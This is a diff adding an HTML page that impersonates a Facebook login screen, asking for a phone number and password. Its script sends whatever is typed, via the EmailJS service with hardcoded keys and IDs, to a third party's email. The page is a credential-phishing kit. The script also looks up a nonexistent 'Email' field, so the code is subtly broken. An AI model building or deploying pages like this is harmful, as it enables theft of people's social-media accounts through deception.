@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Page</title>
+
+<style>
+    *{
+        margin:0;
+        padding:0;
+        box-sizing:border-box;
+        font-family: Arial, sans-serif;
+    }
+
+    body{
+        height:100vh;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        background: linear-gradient(135deg, #4f46e5, #06b6d4);
+    }
+
+    .container{
+        width:350px;
+        background:white;
+        padding:30px;
+        border-radius:15px;
+        box-shadow:0 10px 25px rgba(0,0,0,0.2);
+        text-align:center;
+    }
+
+    h2{
+        color:#4f46e5;
+        margin-bottom:10px;
+    }
+
+    p{
+        color:#666;
+        font-size:14px;
+        margin-bottom:20px;
+    }
+
+    .input-group{
+        margin-bottom:15px;
+    }
+
+    input{
+        width:100%;
+        padding:12px;
+        border:2px solid #ddd;
+        border-radius:8px;
+        outline:none;
+        transition:0.3s;
+    }
+
+    input:focus{
+        border-color:#06b6d4;
+    }
+
+    button{
+        width:100%;
+        padding:12px;
+        border:none;
+        border-radius:8px;
+        background:linear-gradient(135deg, #4f46e5, #06b6d4);
+        color:white;
+        font-size:16px;
+        font-weight:bold;
+        cursor:pointer;
+        transition:0.3s;
+    }
+
+    button:hover{
+        transform:translateY(-2px);
+        box-shadow:0 5px 15px rgba(79,70,229,0.4);
+    }
+
+    .notice{
+        margin-top:15px;
+        font-size:12px;
+        color:#888;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h2> Facebook Login Page</h2>
+    <p>Please enter your details below</p>
+
+    <form id="nameForm">
+        <div class="input-group">
+            <input type="text" id="Phone Number" placeholder="Phone Number" required>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="Password" placeholder="Password" required>
+        </div>
+
+        <button type="Login">Login</button>
+    </form>
+
+    <div class="notice">
+    
+    </div>
+</div>
+
+<!-- EmailJS Library -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+emailjs.init({
+    publicKey: "zpLmpLZIhKz19XAPz"
+});
+
+document.getElementById("nameForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const Email = document.getElementById("Email").value;
+    const Password = document.getElementById("Password").value;
+
+    emailjs.send(
+        "service_yt1pznq",
+        "template_lv2dlf6",
+        {
+            Email: Email,
+            Password: Password
+        }
+    )
+    .then(function(response) {
+        console.log("SUCCESS!", response);
+        alert("Submission Successful, Thank you for your submission.");
+        document.getElementById("nameForm").reset();
+    })
+    .catch(function(error) {
+        console.error("FAILED...", error);
+        alert("Submission failed. Incorrect email or password.");
+    });
+});
+</script>
+
+</body>
+</html>
+
